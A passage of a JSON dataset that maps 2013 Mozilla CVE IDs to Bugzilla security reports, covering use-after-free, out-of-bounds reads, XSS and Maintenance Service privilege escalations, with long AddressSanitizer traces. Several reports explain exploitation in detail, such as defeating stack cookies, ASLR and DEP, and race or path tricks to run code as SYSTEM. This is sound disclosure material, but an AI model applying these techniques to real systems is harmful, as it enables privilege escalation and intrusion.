        "description": "In Bugzilla 2.17.1 (bug 179960), Bugzilla::Search::build_subselect() was introduced to improve performance when querying products and components. Its job is to run the subselect itself and return the corresponding product/component IDs. But by doing this, it leaks the existence of products and components you cannot see. If you try to directly access a product you cannot see, Bugzilla will throw an error of the form \"either this product doesn't exist, or you don't have access to it\". This means you have no way to know if this product exists, as expected. But when running queries, build_subselect() will return 1=2 if the product doesn't exist at all, else it will return the product ID. So you can use this trick to determine if a product doesn't exist at all, or exists but you are not allowed to access it. Bugzilla 2.17.1 to 4.0.x are affected (due to bug 179960), then 4.1.1 to 4.4rc1 are not affected (due to bug 579568), and 4.4rc1+ to 4.5 are affected again (due to bug 780820). As we didn't release 4.4rc2 or 4.5.1 yet, only the 3.6.x and 4.0.x releases are affected by this issue. There is a clear performance by running the subselects in build_subselect() itself and returning the IDs only, so we certainly don't want to revert that. So I have no idea how to fix this issue. The only way would be to disable the debug mode entirely, but that's too useful to be disabled."
      }
    ],
    "CVE-2013-0787": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=848644",
        "title": "Use-after-free caused by us replacing the nsHTMLEditor's edit rules object while running scripts from the flush happening in nsEditor::IsPreformatted triggered by execCommand from web content",
        "description": "Placeholder for Pwn2Own bug found in Firefox by VUPEN at CanSecWest 2013."
      }
    ],
    "CVE-2013-0791": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=629816",
        "title": "CERT_DecodeCertPackage reads bytes outside the input buffer",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.83 Safari/534.13 Build Identifier: http://mxr.mozilla.org/security/source/security/nss/lib/pkcs7/certread.c#187 CERT_DecodeCertPackage may read bytes outside of the input buffer. First, it reads certbuf[0] and certbuf[1] without checking certlen. Though, it may be assuming the input is zero-terminated. But even in that case it's incorrect: for example, at line 218, it reads certbuf[5] ( cp[4] ), but it only knows that bytes certbuf[0] and certbuf[1] are nonzero; it never makes sure that certbuf[2], 3, and 4 are nonzero. This may result in the program crashing if the procedure (and CERT_DecodeCertFromPackage, which calls it) is supplied with a very small input. Reproducible: Always"
      }
    ],
    "CVE-2013-0792": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=722831",
        "title": "some grayscale png images display improperly when \"gfx.color_management.enablev4\" enabled",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686 on x86_64; rv:11.0a2) Gecko/20120131 Firefox/11.0a2 Build ID: 20120131042011 Steps to reproduce: I enabled the \"gfx.color_management.enablev4\" value in \"about:config\" to use my LUT display profile. Actual results: Grayscale png-images from xkcd (eg: http://xkcd.com/386/) display improperly. Expected results: The images should display without errors."
      }
    ],
    "CVE-2013-0793": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=803870",
        "title": "XSS using timed document navigations",
        "description": "It is possible to load an arbitrary website with the document's baseURI pointing to a malicious server, which allows script injection or data theft when the page accesses a relative path. The exploit performs several navigations to achieve a stable result. It seems to me that the crucial part is the following sequence: opener.history.go(0); opener.history.forward(); opener.location.hash='a'; In certain circumstances, the late hash navigation appears to confuse the browser to adopt the same BFCache and/or share a history entry between the 2 adjacent, cross-origin pages."
      }
    ],
    "CVE-2013-0795": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=825697",
        "title": "Components.lookupMethod allows calling of SOW functions",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20121231 Firefox/20.0 Build ID: 20121231030859 Steps to reproduce: Called Components.lookupMethod to obtain the cloneNode method of a SOW protected node. Actual results: I obtained a clone of the node specified in Components.lookupMethod. Expected results: Components.lookupMethod should throw an exception as it did in ff 17."
      }
    ],
    "CVE-2013-0798": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=844832",
        "title": "Installation directory rights allows all",
        "description": "Date: Mon, 25 Feb 2013 10:47:20 +0900 From: Shuichiro Suzuki <suzuki@fourteenforty.jp> To: security@mozilla.org Subject: Security Bug in Firefox for Mobile(Android) -----//----- Dear Sir/Madam Hi. I'm a security researcher in Fourteenforty Research Institute in Japan. I found a security related bug in Firefox for Android and report it here. Abstract: The installation of the Firefox for Android (FFA) makes app_tmp directory world readable and writable(777). With this configuration other applications(might be a malcode) can replace any addons installed through FFA. This leads installing mal-addons without any awareness from users. Scenario: A user installs an android app (which is actually malware) and run it. Then the user tries to install a legitimate addon from Mozilla Addons site(https://addons.mozilla.org). FFA download the addon into temporary directory(app_tmp dir) and keep it there and show dialog to ask if the user really installs it. At this point the malware running background can replace the addon in the temporary directory since the app_tmp directory permission is 777. When the user tap on \"yes\" on the dialog FFA installs the replaced addon with the name of the original(downloaded) addon's name. Since addons for FFA has a great power of stealing any data in the browser this may leads security problem. Technical Detail: The main problem here is that the app_tmp directory's permission is 777. I do not know how this directory is used but this can be 700 (Since it seems that other apps do not need to know what is in the dir) And also you should ensure that downloaded and installed addons are the same thing. Others: Android has a class \"FileObserver\" which notifies an application when a file or directory content is changed. The malware can use this class with path \"/data/data/org.mozilla.firefox/app_tmp\". This enables the malware to replace the addon downloaded by FFA just after download is finished and just before the user tap on \"yes\" button on the installation dialog. The malware do not need any special permission. This may not a problem in Windows platform since its security model is different from Android one. In Windows any software other than Firefox may be able to replace any addons within the same user's context. Since security concept of the Android is different from Windows's one I consider this as a security problem. Best regards, Shuichiro Suzuki Fourteenforty Research Institute suzuki@fourteenforty.jp"
      }
    ],
    "CVE-2013-0799": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=848417",
        "title": "Mozilla Maintenance Service buffer overflow allowing privilege escalation",
        "description": "The Mozilla Maintenance Service is vulnerable to a stack-based buffer overflow, allowing an unprivileged user to escalate privileges to NT_AUTHORITY\\SYSTEM. The bug lies in workmonitor.cpp, in the ProcessSoftwareUpdateCommand function, at lines 307-308, where a fixed size array is passed to GetInstallationDir: WCHAR installDir[MAX_PATH] = {L'\\0'}; if (!GetInstallationDir(argc, argv, installDir)) { GetInstallationDir, in turn, performs an unchecked copy of argv[2] into the destination buffer (here, installDir): static BOOL GetInstallationDir(int argcTmp, LPWSTR *argvTmp, WCHAR aResultDir[MAX_PATH]) { if (argcTmp < 2) { return FALSE; } wcscpy(aResultDir, argvTmp[2]); Maintenanceservice.exe wrongly assumes that its arguments have a valid size. However, due to the way the maintenance service is configured, any unprivileged user can start it, with arbitrary arguments: this is why Firefox can use it to upgrade without triggering an UAC prompt. In the ProcessSoftwareUpdateCommand stack layout, the installDir buffer is located 588 bytes before the security cookie used to protect against stack based buffer overflows. Therefore, an argv[2] greater than 588 bytes will trigger a process termination due to this protection, and an event will be added to the Windows' event log. The attached PoC triggers the bug with a 592 bytes long argv[2]. The event can later be viewed with Windows' event viewer, under the Windows logs > Application category: Problem signature: P1: maintenanceservice.exe => exe filename P2: 19.0.0.4794 => exe version P3: 511eba22 => exe timestamp [...] P7: 0000313b => faulting offset from ImageBase, this is the instruction right after __security_check_cookie in ProcessSoftwareUpdateCommand P8: c0000409 => Exception type: Stack buffer overflow Although it may look like the bug is not exploitable due to the stack overflow protection, it is indeed possible to exploit this bug: -The service can be launched as many times as needed: the attacker gets as many tries as needed. -The security cookie (stack overflow protection) is predictable (see below). -ASLR and DEP are useless (see below). Stack overflow protection: The stack overflow protection works by generating a 32 bits integer which is called the security cookie. It is supposed to be random, however it is not. It is obtained by XORing the result of GetSystemTimeAsFileTime, GetTickCount, QueryPerformanceCounter, the process ID, and the thread ID: -An attacker can call the 3 functions just before launching the service, and the results will be nearly identical, as they are all time-based. Even if there is a difference, it'll affect only the lowest bits of the security cookie. -The process ID is predictable, as is the thread ID. Furthermore, they are low values, never superior to 1,000,000, and as such will affect only the lowest bits of the security cookie. This makes the real entropy of the security cookie 16 bits, low enough to make an attack practical. ASLR and DEP: DEP is defeated with a ROP payload. ASLR is useless because the base addresses of some DLLs like ntdll and kernel32 are randomized at boot time, and don't change until next reboot. An attacker running can just call GetModuleHandle to get their base addresses, and adapt the payload. This was tested on Windows 7 64 bits, and it should work on all versions of Windows."
      }
    ],
    "CVE-2013-1670": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=853709",
        "title": "Its possible to call a content level constructor as if from a chrome/privileged page",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0 Build ID: 20130307023931 Steps to reproduce: I used the mozContact constructor to gain access to a chrome level array and then added a content level constructor to it and defined a setter to do the calling for me. Actual results: The content level constructor behaves as if called from a privileged page as shown from the error, this works with most content level constructors(that are function objects) but using the File constructor was just the easiest way to show this off. I had discussed this issue in passing in an email with Bobby Holly but hadn't had an easy way to show it off. Expected results: Chrome level Objects exposed to content should be careful about any properties that are 'rw' as defined in __exposedProps__, I think it may be best to avoid it at all if possible. Arrays from chrome and the normal COWs(this works with them too) are going to have to be rethought. This happens I believe because Function Objects inherit their principals from the nearest Object in the scope of their execution."
      }
    ],
    "CVE-2013-1671": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=842255",
        "title": "It's possible to get the full path from a file control",
        "description": "By using XBL bugs discussed in bug 816071 and bug 817922, it's possible to get the full path from a file control."
      }
    ],
    "CVE-2013-1672": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=850492",
        "title": "Arbitrary code execution by Maintenance Service with junctions",
        "description": "I was having a bit of a poke around the Mozilla Maintenance Service and believe I've come across a vulnerability that lets unprivileged users execute arbitrary code as the SYSTEM user. The crux of the problem is that updatehelper.cpp:IsLocalFile() doesn't take into account the existence of junctions (which standard users can create). We can fool the Maintenance Service into thinking the updater.exe is on a local drive, by creating a junction, eg. c:\\thumbdrive to a removable drive d:. PathStripToRootW returns c: so the process continues. This leads to a race condition since we can dismount the drive after the updater.exe has been validated (workmonitor.cpp:403). This kills the write-lock the Maintenance Service has on the updater.exe. Between the validation and when the process is run (workmonitor.cpp:182) we can replace the lockless file with our malicious payload which the Maintenance Service then happily executes as the SYSTEM user. I've attached a proof-of-concept to this bug. It executes reliably for me on Windows 7 x64, FF 19.0.2. I believe Vista and XP would be vulnerable as well, but haven't confirmed. To run the proof-of-concept, you will need to have the binaries run_exploit.exe and payload.exe in \"C:\\exploit\", Firefox installed to \"C:\\Program Files (x86)\\Mozilla Firefox\", and a removable drive mounted. run_exploit.exe takes one mandatory parameter - the drive letter of your removable drive (eg. c:\\exploit\\run_exploit.exe d:). It will create updater.exe and updater.ini on the removable drive, and a c:\\thumbdrive junction. payload.exe can be replaced with your payload of choice. This one just executes system(\"whoami > /foo.txt\"); to verify the process has SYSTEM credentials. It will create foo.txt in the root drive. Source code for both are contained in the attached zip file. If you need any more info please let me know. Seb"
      }
    ],
    "CVE-2013-1673": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=854088",
        "title": "old MozillaMaintenance Service registry entry not updated, leads to Trusted Path Privilege Escalation",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0 Build ID: 20130307023931 Steps to reproduce: Steps to reproduce: 1. Copy calc.exe to C:\\program.exe or C:\\Program Files (x86)\\mozilla.exe. You can also use my payload (attached). 2. Start MozillaMaintenance using the service manager or the command-line. 3. calc.exe (program.exe - mozilla.exe) will be run with SYSTEM privileges Actual results: The malicious executable was executed with SYSTEM privileges! Expected results: The service executable shouldn't run program.exe (C:\\program.exe) or mozilla.exe (C:\\Program Files (x86)\\mozilla.exe). Although you need to be running as a high integrity process to create files in the root directory and its subfolders you could use this vulnerability to escalate your privileges or to automatically re-compromise the target in the future (with SYSTEM privileges)!"
      }
    ],
    "CVE-2013-1674": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=860971",
        "title": "UAF with video and onresize event",
        "description": "The attached testcase crashes central and stables. skeleton.ogv needs to be in the same directory. The stack on windows looks as follows:"
      }
    ],
    "CVE-2013-1675": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=866825",
        "title": "nsDOMSVGZoomEvent::m{Previous,New}Scale are used uninitialized",
        "description": "Noticed while reviewing bug 866679. Attached test shows that we return garbage to JS."
      }
    ],
    "CVE-2013-1676": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=818454",
        "title": "Out of Bounds Read in SelectionIterator::GetNextSegment",
        "description": "==31621== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ff3ebc86f00 at pc 0x7ff40dbe4966 bp 0x7fff6b40d150 sp 0x7fff6b40d148 READ of size 4 at 0x7ff3ebc86f00 thread T0 #0 0x7ff40dbe4965 in gfxShapedWord::CompressedGlyph::IsClusterStart() const src/gfx/thebes/gfxFont.h:1920 #1 0x7ff40db2dfbc in gfxTextRun::IsClusterStart(unsigned int) src/gfx/thebes/gfxFont.h:2383 #2 0x7ff40db5c58c in SelectionIterator::GetNextSegment(double*, unsigned int*, unsigned int*, double*, short*, nsTextRangeStyle*) src/layout/generic/nsTextFrameThebes.cpp:5287 #3 0x7ff40db6c52d in nsTextFrame::PaintTextSelectionDecorations(gfxContext*, gfxPoint const&, gfxPoint const&, gfxRect const&, PropertyProvider&, unsigned int, unsigned int, nsTextPaintStyle&, SelectionDetails*, short, nsTextFrame::DrawPathCallbacks*) src/layout/generic/nsTextFrameThebes.cpp:5581 #4 0x7ff40db707ab in nsTextFrame::PaintTextWithSelection(gfxContext*, gfxPoint const&, gfxPoint const&, gfxRect const&, PropertyProvider&, unsigned int, unsigned int, nsTextPaintStyle&, nsCharClipDisplayItem::ClipEdges const&, nsTextFrame::DrawPathCallbacks*) src/layout/generic/nsTextFrameThebes.cpp:5636 #5 0x7ff40db4d125 in nsTextFrame::PaintText(nsRenderingContext*, nsPoint, nsRect const&, nsCharClipDisplayItem const&, nsTextFrame::DrawPathCallbacks*) src/layout/generic/nsTextFrameThebes.cpp:5860 #6 0x7ff40db4b2d3 in nsDisplayText::Paint(nsDisplayListBuilder*, nsRenderingContext*) src/layout/generic/nsTextFrameThebes.cpp:4572 #7 0x7ff40cdde2f6 in mozilla::FrameLayerBuilder::DrawThebesLayer(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*) src/layout/base/FrameLayerBuilder.cpp:3282 #8 0x7ff41a3d6a0f in mozilla::layers::BasicThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) src/gfx/layers/basic/BasicThebesLayer.h:94 #9 0x7ff41a3d60be in mozilla::layers::BasicShadowableThebesLayer::PaintBuffer(gfxContext*, nsIntRegion const&, nsIntRegion const&, nsIntRegion const&, bool, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*) src/gfx/layers/basic/BasicThebesLayer.cpp:402 #10 0x7ff41a3cec7b in mozilla::layers::BasicThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicThebesLayer.cpp:189 #11 0x7ff41a3d371a in mozilla::layers::BasicShadowableThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicThebesLayer.cpp:303 #12 0x7ff41a3d4103 in non-virtual thunk to mozilla::layers::BasicShadowableThebesLayer::PaintThebes(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicThebesLayer.cpp:314 #13 0x7ff41a35d495 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) src/gfx/layers/basic/BasicLayerManager.cpp:827 #14 0x7ff41a35a8e9 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicLayerManager.cpp:942 #15 0x7ff41a35da75 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) src/gfx/layers/basic/BasicLayerManager.cpp:843 #16 0x7ff41a35a8e9 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicLayerManager.cpp:942 #17 0x7ff41a35da75 in mozilla::layers::BasicLayerManager::PaintSelfOrChildren(mozilla::layers::PaintContext&, gfxContext*) src/gfx/layers/basic/BasicLayerManager.cpp:843 #18 0x7ff41a35a8e9 in mozilla::layers::BasicLayerManager::PaintLayer(gfxContext*, mozilla::layers::Layer*, void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::ReadbackProcessor*) src/gfx/layers/basic/BasicLayerManager.cpp:942 #19 0x7ff41a355d01 in mozilla::layers::BasicLayerManager::EndTransactionInternal(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) src/gfx/layers/basic/BasicLayerManager.cpp:589 #20 0x7ff41a354447 in mozilla::layers::BasicLayerManager::EndTransaction(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) src/gfx/layers/basic/BasicLayerManager.cpp:508 #21 0x7ff41a3677c3 in mozilla::layers::BasicShadowLayerManager::EndTransaction(void (*)(mozilla::layers::ThebesLayer*, gfxContext*, nsIntRegion const&, nsIntRegion const&, void*), void*, mozilla::layers::LayerManager::EndTransactionFlags) src/gfx/layers/basic/BasicLayerManager.cpp:1142 #22 0x7ff40d0d70cc in nsDisplayList::PaintForFrame(nsDisplayListBuilder*, nsRenderingContext*, nsIFrame*, unsigned int) const src/layout/base/nsDisplayList.cpp:1141 #23 0x7ff40d0d4227 in nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) const src/layout/base/nsDisplayList.cpp:1003 #24 0x7ff40d276425 in nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int) src/layout/base/nsLayoutUtils.cpp:1872 #25 0x7ff40d3cd0a9 in PresShell::Paint(nsIView*, nsRegion const&, unsigned int) src/layout/base/nsPresShell.cpp:5329 #26 0x7ff41140e63a in nsViewManager::ProcessPendingUpdatesForView(nsView*, bool) src/view/src/nsViewManager.cpp:433 #27 0x7ff411421a2c in nsViewManager::ProcessPendingUpdates() src/view/src/nsViewManager.cpp:1208 #28 0x7ff40d44c1e7 in nsRefreshDriver::Notify(nsITimer*) src/layout/base/nsRefreshDriver.cpp:432 #29 0x7ff419ad5f63 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:485 #30 0x7ff419ad7301 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:565 #31 0x7ff419a99ffe in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 #32 0x7ff41970f08f in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:221 #33 0x7ff417c8d2b6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #34 0x7ff419d82ade in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:215 #35 0x7ff419d82925 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:208 #36 0x7ff419d8280b in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 #37 0x7ff4170a55f4 in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #38 0x7ff415c06af2 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #39 0x7ff40b126c44 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3823 #40 0x7ff40b12c919 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3890 #41 0x7ff40b12f690 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4084 #42 0x40c0c6 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #43 0x409900 in main src/browser/app/nsBrowserApp.cpp:279 #44 0x7ff42b5fa76c in 0x7ff3ebc86f00 is located 8 bytes to the right of 184-byte region [0x7ff3ebc86e40,0x7ff3ebc86ef8) allocated by thread T0 here: #0 0x4c3810 in malloc #1 0x7ff429188855 in moz_malloc src/memory/mozalloc/mozalloc.cpp:64 #2 0x7ff41a10d1eb in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) src/gfx/thebes/gfxFont.cpp:4491 #3 0x7ff41a0f0441 in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) src/gfx/thebes/gfxFont.cpp:4508 #4 0x7ff41a0f3d33 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) src/gfx/thebes/gfxFont.cpp:3553 #5 0x7ff40db1473a in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) src/layout/generic/nsTextFrameThebes.cpp:553 #6 0x7ff40db0963b in BuildTextRunsScanner::BuildTextRunForFrames(void*) src/layout/generic/nsTextFrameThebes.cpp:2050 #7 0x7ff40dafe5f5 in BuildTextRunsScanner::FlushFrames(bool, bool) src/layout/generic/nsTextFrameThebes.cpp:1409 #8 0x7ff40db0e12d in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1601 Shadow byte and word: 0x1ffe7d790de0: fa 0x1ffe7d790de0: fa fa fa fa fa fa fa fa More shadow bytes: 0x1ffe7d790dc0: fa fa fa fa fa fa fa fa 0x1ffe7d790dc8: 00 00 00 00 00 00 00 00 0x1ffe7d790dd0: 00 00 00 00 00 00 00 00 0x1ffe7d790dd8: 00 00 00 00 00 00 00 fb =>0x1ffe7d790de0: fa fa fa fa fa fa fa fa 0x1ffe7d790de8: 00 00 00 00 00 00 00 00 0x1ffe7d790df0: 00 00 00 00 00 00 fb fb 0x1ffe7d790df8: fa fa fa fa fa fa fa fa 0x1ffe7d790e00: fa fa fa fa fa fa fa fa Stats: 262M malloced (245M for red zones) by 451453 calls Stats: 47M realloced by 19228 calls Stats: 228M freed by 226481 calls Stats: 193M really freed by 173783 calls Stats: 245M (62800 full pages) mmaped in 467 calls mmaps by size class: 7:217035; 8:47081; 9:14322; 10:5621; 11:7650; 12:1280; 13:1088; 14:512; 15:224; 16:720; 17:464; 18:34; 19:35; 20:21; mallocs by size class: 7:304827; 8:87290; 9:24303; 10:8218; 11:17377; 12:2304; 13:2068; 14:1626; 15:415; 16:1440; 17:1449; 18:73; 19:41; 20:22; frees by size class: 7:125017; 8:55922; 9:17553; 10:4893; 11:15407; 12:1512; 13:1639; 14:1437; 15:293; 16:1261; 17:1430; 18:60; 19:38; 20:19; rfrees by size class: 7:95680; 8:43221; 9:14163; 10:3105; 11:11615; 12:1100; 13:1032; 14:1283; 15:230; 16:933; 17:1315; 18:50; 19:37; 20:19; Stats: malloc large: 3440 small slow: 5269 ==31621== ABORTING"
      }
    ],
    "CVE-2013-1677": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=826163",
        "title": "Out-of-bound read in gfxSkipCharsIterator::SetOffsets",
        "description": "Reproduces on trunk. >==20823== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f2a4ada32cc at pc 0x7f2a7fc58c4c bp 0x7fff9bb19a10 sp 0x7fff9bb19a08 >READ of size 4 at 0x7f2a4ada32cc thread T0 > #0 0x7f2a7fc58c4b in gfxSkipCharsIterator::SetOffsets(unsigned int, bool) src/gfx/thebes/gfxSkipChars.cpp:91 > #1 0x7f2a71fedf14 in gfxSkipCharsIterator::SetOriginalOffset(int) src/../../../dist/include/gfxSkipChars.h:232 > #2 0x7f2a728d57a8 in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsTextFrameThebes.cpp:7877 > #3 0x7f2a726cfc69 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:847 > #4 0x7f2a7269fc7d in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 > #5 0x7f2a7269cc36 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 > #6 0x7f2a72699856 in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:395 > #7 0x7f2a726cf77d in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:840 > #8 0x7f2a7238d9b2 in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) src/layout/generic/nsBlockFrame.cpp:3725 > #9 0x7f2a72387fd6 in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) src/layout/generic/nsBlockFrame.cpp:3522 > #10 0x7f2a7237abea in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3376 > #11 0x7f2a72369ecb in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2483 > #12 0x7f2a72350be8 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2000 > #13 0x7f2a72343dd4 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1043 > #14 0x7f2a723d2921 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:268 > #15 0x7f2a72374ec6 in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3101 > #16 0x7f2a72369bea in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2480 > #17 0x7f2a72350be8 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2000 > #18 0x7f2a72343dd4 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1043 > #19 0x7f2a724327cd in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:953 > #20 0x7f2a725fd5a7 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:493 > #21 0x7f2a724327cd in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:953 > #22 0x7f2a72576746 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:433 > #23 0x7f2a7257af47 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:533 > #24 0x7f2a7257f397 in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:774 > #25 0x7f2a724327cd in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:953 > #26 0x7f2a72971a8b in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) 